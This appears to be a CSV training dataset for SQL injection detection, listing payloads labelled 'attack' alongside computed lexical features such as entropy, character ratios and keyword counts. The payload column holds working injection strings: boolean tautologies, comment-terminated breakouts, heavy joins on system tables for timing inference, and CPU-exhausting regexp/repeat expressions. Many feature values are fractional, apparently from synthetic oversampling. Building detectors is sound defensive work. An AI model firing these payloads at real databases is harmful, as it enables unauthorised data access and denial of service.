id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000436,0.08118010545691232,155.34194909751758,32.221073453664324,4.081775354154412,81.56302255118192,16.0,42.778926546335676,15.0,0.524715742596286,0.10310078112674795,0.2755264939706399,0.0966569823063262,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000012,attack,boolean,"-6095""   )    )    as kgfp where 3601  =  3601 or 7287  =  9373#",nearest_attack_euclidean,R000877,0.034196697085487296,64.0,25.833417406423223,3.7335999327170395,13.0,20.0,24.0,7.0,0.203125,0.3125,0.375,0.109375,0.0,1.0,1.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000415,0.1853130108073178,72.18640498196628,26.349123985573026,3.619016915448559,11.34912398557303,24.0,27.999999999999996,8.837280996393256,0.15677864447285164,0.33270070113473194,0.38815081799052054,0.12236983640189587,0.0,0.0,1.0,0.0,0.0,2.0,0.0,4.0,0.0,0.8372809963932564,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'fnon' like 'fnon",nearest_attack_euclidean,R000445,0.0457986334553165,117.53152473475977,26.15186420993136,4.0843430343656095,77.0,2.9999999999999982,25.455592629794086,12.075932104965682,0.6552986349202852,0.025531115646244884,0.21643343116328329,0.10273681827018662,3.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0759321049656805,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000015,attack,boolean,-7207' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'obxw'  =  'obxw,nearest_attack_euclidean,R000657,0.31969283396723125,360.6215303201268,37.126156559957735,3.720802283558548,101.12615655995774,47.621530320126794,150.0,61.873843440042265,0.2804265615052224,0.13204737763041588,0.41595173595986457,0.1715743249044971,4.0,0.0,0.8738434400422654,0.0,0.0,3.0,0.0,30.0,0.0,3.0,0.0,23.87384344004227,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1261565599577346,0.8738434400422654,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000016,attack,boolean,"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bxcb"" like ""bxcb",nearest_attack_euclidean,R000186,0.025342079052235976,391.77949127350496,31.98529941823366,3.319402529398468,106.94119767293463,47.0,182.85299418233663,54.985299418233666,0.27296286419047633,0.11996808795367067,0.46671985341054884,0.1403491944453041,0.0,4.0,0.0,0.0,0.0,2.014700581766338,0.0,37.97059883646732,0.0,0.0,1.0,12.014700581766338,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000017,attack,boolean,"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",nearest_attack_euclidean,R001141,0.2416045385186278,213.18128673243532,31.0,3.6187989071527014,120.0,12.0,60.86967434208743,20.311612390347904,0.5634611798908923,0.056346117989089214,0.2849614447060344,0.09523125741398411,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.3116123903479044,0.0,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,boolean,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000664,0.1825474141555895,243.7833697999656,38.0,3.7433722006864056,72.0,27.0,100.40983395291288,44.373535847052764,0.29569902482753524,0.11088713431032571,0.4113868167027981,0.18202702415934094,1.0,0.0,2.0,0.0,0.0,1.0,0.0,23.373535847052757,1.0,1.9999999999999998,4.0,13.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000019,attack,boolean,"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye",nearest_attack_euclidean,R001157,0.35136968102200167,159.22316667187965,29.44451190513426,3.8728123551057267,82.0,8.0,50.33414286161113,18.889023810268522,0.5159759043836197,0.050339112622792184,0.31509848372243426,0.11858649927115378,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.889023810268521,0.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000020,attack,boolean,"-7743"" or 9323  =  9323#",nearest_attack_euclidean,R001497,0.7476335532902442,23.691025406775964,12.0,3.205827331148556,2.0,12.0,6.0,3.6910254067759674,0.08445280649718848,0.5067168389831311,0.25335841949156557,0.15547193502811477,0.0,0.6910254067759679,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.6910254067759679,0.0,1.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000021,attack,boolean,1  )   as qgsb where 7600  =  7600 and 2006  =  2006,nearest_attack_euclidean,R000179,0.3290002552715515,54.37511609762946,19.0,3.361336890841598,14.0,17.0,20.035813797968103,3.339302299661348,0.2583925601803089,0.3137623945046608,0.3667243245557403,0.06112072075929005,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.33930229966135,0.0,0.0,0.0,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000022,attack,boolean,"1""   )    )     )   and 7153  =  7474--",nearest_attack_euclidean,R000279,0.6740596912049981,39.391245343383815,12.608754656616181,2.652514544977705,3.0,9.0,20.0,7.391245343383819,0.07617068203195418,0.2285120460958626,0.5078045468796946,0.1875127249924886,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.0,0.3912453433838189,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000023,attack,boolean,-4900'   )    )    or 7208  =  3236,nearest_attack_euclidean,R000716,0.07194840833246854,35.000000000000014,14.604364820887445,2.970821363791007,2.0,12.0,16.0,5.0,0.05714285714285716,0.34285714285714286,0.45714285714285713,0.14285714285714285,1.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000024,attack,boolean,"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""wute"" like ""wute",nearest_attack_euclidean,R001536,0.4991824947234616,289.2161836344426,37.21618363444259,3.647580316009454,86.78381636555741,27.43236726888518,126.0,49.0,0.30006818939803825,0.09484688202574713,0.43566114857487453,0.1694237800013401,0.0,4.0,0.0,0.0,0.0,1.0,0.0,28.0,0.0,1.9999999999999998,4.0,11.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7838163655574104,0.21618363444258948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000025,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",nearest_attack_euclidean,R001320,0.11615887462946607,233.93133177874253,34.0,3.597194527736097,67.72532711497011,27.0,102.13733644251494,37.068668221257475,0.28950508022355226,0.11541862077645633,0.4366153275029669,0.1584609714970246,0.0,4.0,0.0,0.0,0.0,1.0686682212574725,0.0,22.0,0.0,1.0,3.0,7.0686682212574725,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000026,attack,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000088,0.8183977403792704,63.9553352414469,23.0,3.427410400190469,24.0,4.0,26.47766762072346,9.477667620723455,0.3753533465702745,0.06255889109504575,0.4139815247443121,0.14810623759036765,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.5223323792765449,0.0,0.0,5.95533524144691,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000027,attack,boolean,"1""   )    )    rlike   (  select   (  case when   (  5342  =  1036  )   then 1 else 0x28 end   )    )    and    (    (   ""ntdz"" like ""ntdz",nearest_attack_euclidean,R001196,1.365389441300428,130.4004184293257,27.638115163301222,3.3782579456012725,41.657381959614675,13.0,60.38115163301223,15.361884836698778,0.31786816937184714,0.10032172429200831,0.46296123782229925,0.11884886851384528,0.0,4.0,0.0,0.0,0.0,1.3618848366987768,0.0,9.276230326602446,0.7237696733975537,0.0,0.0,1.3618848366987768,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000028,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",nearest_attack_euclidean,R000131,0.18306487073922348,116.94696549965781,27.473482749828907,4.07396621492648,76.31437924880235,2.9999999999999982,25.10606900068437,12.526517250171093,0.6523480063841358,0.025654522465007767,0.21484043947900539,0.1071570316718509,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.526517250171092,0.0,0.0,2.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
